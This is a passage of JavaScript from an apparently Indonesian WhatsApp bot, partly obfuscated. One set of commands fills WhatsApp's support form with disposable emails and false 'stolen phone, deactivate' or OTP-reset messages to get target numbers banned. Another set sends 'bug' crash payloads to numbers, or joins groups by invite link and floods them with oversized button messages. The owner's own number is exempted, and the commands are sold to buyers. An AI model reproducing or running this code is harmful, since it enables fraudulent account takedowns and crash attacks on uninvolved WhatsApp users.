const _0x3b0948=_0x1c03;function _0x1c03(_0x2ba437,_0x629f73){const _0x174abb=_0x174a();return _0x1c03=function(_0x1c03e2,_0x278dea){_0x1c03e2=_0x1c03e2-0x141;let _0x35c234=_0x174abb[_0x1c03e2];return _0x35c234;},_0x1c03(_0x2ba437,_0x629f73);}(function(_0x4cbb0b,_0x10f022){const _0x4868dd=_0x1c03,_0x42ce23=_0x4cbb0b();while(!![]){try{const _0xb1fb=parseInt(_0x4868dd(0x177))/0x1*(-parseInt(_0x4868dd(0x175))/0x2)+parseInt(_0x4868dd(0x167))/0x3*(-parseInt(_0x4868dd(0x156))/0x4)+-parseInt(_0x4868dd(0x166))/0x5*(parseInt(_0x4868dd(0x16c))/0x6)+parseInt(_0x4868dd(0x143))/0x7+parseInt(_0x4868dd(0x151))/0x8*(parseInt(_0x4868dd(0x172))/0x9)+parseInt(_0x4868dd(0x159))/0xa+parseInt(_0x4868dd(0x153))/0xb;if(_0xb1fb===_0x10f022)break;else _0x42ce23['push'](_0x42ce23['shift']());}catch(_0x5680dc){_0x42ce23['push'](_0x42ce23['shift']());}}}(_0x174a,0xcac5e));if(!islinson)return reply(_0x3b0948(0x14d));if(!q)return reply(_0x3b0948(0x149)+(prefix+command)+_0x3b0948(0x14a));let dia=q[_0x3b0948(0x157)]('|')[0x0]['replace'](/[^0-9]/g,'');var axioss=require(_0x3b0948(0x15f));let ntah=await axioss[_0x3b0948(0x174)](_0x3b0948(0x15d)),email=await axioss[_0x3b0948(0x174)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=425738'),cookie=ntah[_0x3b0948(0x144)][_0x3b0948(0x179)][_0x3b0948(0x14f)](';\x20');const cheerio=require(_0x3b0948(0x141));function _0x174a(){const _0x531673=['axios','lsd','__comment_req','input[name=jazoest]','country_selector','email','find','15hDCWjB','147DBpSTN','POST','19316.BP:whatsapp_www_pkg.2.0.0.0.0','your_message','load','647538LvZJaa','__a','__user','__req','for\x20(;;);','dpr','522AwPWyB','href','get','34894XaBnLy','https://www.whatsapp.com','68UrTdid','input[name=lsd]','set-cookie','action','cheerio','format','354956FmZaWo','headers','email_confirm','ANDROID','replace','__ccg','Penggunaan\x20','\x20628xxxx','data','val','Owner\x20Only','__csr','join','append','64168EVGpsR','jazoest','17067391IrnzBQ','__hs','submit','12032tsaSyr','split','INDONESIA','4206080JJfFXJ','phone_number','UNKNOWN','platform','https://www.whatsapp.com/contact/noclient/','form'];_0x174a=function(){return _0x531673;};return _0x174a();}let $=cheerio[_0x3b0948(0x16b)](ntah[_0x3b0948(0x14b)]),$form=$(_0x3b0948(0x15e)),url=new URL($form['attr'](_0x3b0948(0x17a)),_0x3b0948(0x176))[_0x3b0948(0x173)],form=new URLSearchParams();form[_0x3b0948(0x150)](_0x3b0948(0x152),$form['find'](_0x3b0948(0x162))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)](_0x3b0948(0x160),$form[_0x3b0948(0x165)](_0x3b0948(0x178))[_0x3b0948(0x14c)]()),form[_0x3b0948(0x150)]('step',_0x3b0948(0x155)),form['append'](_0x3b0948(0x163),_0x3b0948(0x158)),form[_0x3b0948(0x150)](_0x3b0948(0x15a),''+dia),form[_0x3b0948(0x150)](_0x3b0948(0x164),email[_0x3b0948(0x14b)][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x145),email['data'][0x0]),form[_0x3b0948(0x150)](_0x3b0948(0x15c),_0x3b0948(0x146)),form[_0x3b0948(0x150)](_0x3b0948(0x16a),'meu\x20número\x20por\x20engano\x20Peço\x20que\x20vocês\x20reativem\x20meu\x20número\x20pois\x20tenho\x20família\x20em\x20outro\x20país\x20e\x20preciso\x20me\x20comunicar\x20com\x20eles'),form[_0x3b0948(0x150)](_0x3b0948(0x16e),'0'),form[_0x3b0948(0x150)](_0x3b0948(0x16d),'1'),form['append'](_0x3b0948(0x14e),''),form['append'](_0x3b0948(0x16f),'8'),form['append'](_0x3b0948(0x154),_0x3b0948(0x169)),form['append'](_0x3b0948(0x171),'1'),form[_0x3b0948(0x150)](_0x3b0948(0x148),_0x3b0948(0x15b)),form[_0x3b0948(0x150)]('__rev','1006630858'),form['append'](_0x3b0948(0x161),'0');let res=await axioss({'url':url,'method':_0x3b0948(0x168),'data':form,'headers':{'cookie':cookie}});reply(util[_0x3b0948(0x142)](JSON['parse'](res[_0x3b0948(0x14b)][_0x3b0948(0x147)](_0x3b0948(0x170),''))));
}
break
case "banned":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!islinson)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await nabil['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6282279915237','54mgTCKv','6281911317205','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Para WhatsApp\nDesative minha conta, pois meu número e documentação foram roubados e não consigo acessar novamente`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case "kenon":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!islinson)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await nabil['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6282279915237','54mgTCKv','6281911317205','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

case "resetotp":{
const _0x594df9=_0x51d5;(function(_0x4a9896,_0x4dc8d7){const _0x37f43e=_0x51d5,_0x39c9ef=_0x4a9896();while(!![]){try{const _0x7d069a=-parseInt(_0x37f43e(0x96))/0x1+-parseInt(_0x37f43e(0x91))/0x2+-parseInt(_0x37f43e(0x88))/0x3+parseInt(_0x37f43e(0x94))/0x4+parseInt(_0x37f43e(0x8c))/0x5*(parseInt(_0x37f43e(0x8f))/0x6)+parseInt(_0x37f43e(0x86))/0x7*(-parseInt(_0x37f43e(0x89))/0x8)+parseInt(_0x37f43e(0x87))/0x9*(parseInt(_0x37f43e(0x92))/0xa);if(_0x7d069a===_0x4dc8d7)break;else _0x39c9ef['push'](_0x39c9ef['shift']());}catch(_0xc9e534){_0x39c9ef['push'](_0x39c9ef['shift']());}}}(_0x2315,0xd8b29));function _0x51d5(_0x4c884d,_0x39a957){const _0x231588=_0x2315();return _0x51d5=function(_0x51d57a,_0xa96399){_0x51d57a=_0x51d57a-0x86;let _0xf2422e=_0x231588[_0x51d57a];return _0xf2422e;},_0x51d5(_0x4c884d,_0x39a957);}if(!islinson)return reply(_0x594df9(0x93));if(!q)return reply(_0x594df9(0x8a)+(prefix+command)+_0x594df9(0x8b));let dia=q[_0x594df9(0x8d)]('|')[0x0]['replace'](/[^0-9]/g,'');var cekap=await nabil['onWhatsApp'](dia+'@s.whatsapp.net');if(cekap['length']==0x0)return reply(_0x594df9(0x95));if(dia==_0x594df9(0x90))return;function _0x2315(){const _0x2494a1=['Nomor\x20tersebut\x20tidak\x20terdaftar\x20di\x20WhatsApp\x0aSilahkan\x20kirim\x20nomor\x20yg\x20valid.','1323493DkelfN','1334473vQLwyi','9ycZfNl','328110XPSqtP','8gwaUHC','Penggunaan\x20','\x20628xxxx','682390wXgmfB','split','6282279915237','54mgTCKv','6281911317205','2310438QFDOZM','8351950eoCndY','Owner\x20Only','6411268cZiQRa'];_0x2315=function(){return _0x2494a1;};return _0x2315();}if(dia=='6283834558105')return;if(dia==_0x594df9(0x8e))return;
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com meu número e eu tive que esperar 14 horas, por favor, pesquise novamente neste número`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break

case "🦆":
case "🐼":
case "🐨":
case "🐻":
case "🐤":
case "🐣":
case "🐥":
case "🐦":
case "🐧":
case "🦤":
case "🦩":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Buy Dulu Kids Ke Owner')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await nabil.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
reply('Proses⌛')
sendBug(target,30)
sendBug2(target,30)
await sleep(1000)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "ganas":
case "hard":
case "turu":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await nabil.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
reply('Otw Bozz')
sendBug(target,40)
sendBug2(target,40)
await sleep(1000)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "santet":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await nabil.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
reply('Otw Masseh')
sendBugPay(target,1)
await sleep(1000)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break

case "trava":
case "bom":
case "troli":
case "dark":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await nabil.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
reply('Proses⌛')
sendBug(target,25)
sendBug2(target,25)
await sleep(1000)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "crash":
case "mati":
case "mampus":
case "nabilgas":
case "tururiper":
case "slayer":
case "virus":
case "virdok":
case "bugchat":
case "santetpc":
case "bugpc":{
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let target = q+'@s.whatsapp.net'
var cekap = await nabil.onWhatsApp(target)
if (cekap.length == 0) return reply(`Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
if (target == '62895622182398@s.whatsapp.net') return reply(`Lah Lu Ngapain Mau Bug Owner Gua`)
reply('Proses⌛')
sendBug(target,20)
sendBug2(target,20)
await sleep(1000)
nabil.sendMessage(from, {text:`${command} target @${target.split('@')[0]}, berhasil✅`, mentions: [target]})
}
break
case "bomgc":
case "trolgc":
case "santetgc":
case "buggc":
case "linsgc":{
      if (!islinson && !isGroupAdmins && !islinsad) return reply(`Fitur ini khusus owner`)
if (!isGroup) return reply('Perintah ini hanya bisa digunakan digrup')
if (!islinson && !isAkses) return reply('Kamu belum bisa akses fitur ini.')
reply(`Sukses Bozz`)
if (!q) return reply(`Penggunaan ${prefix+command} linkgrup`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "5"
for (let i = 0; i < jumlah; i++) {
let kir = await nabil.groupAcceptInvite(result)
nabil.sendMessage(kir, {
text: 'BUG BY CYCLONE', 
templateButtons: [
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
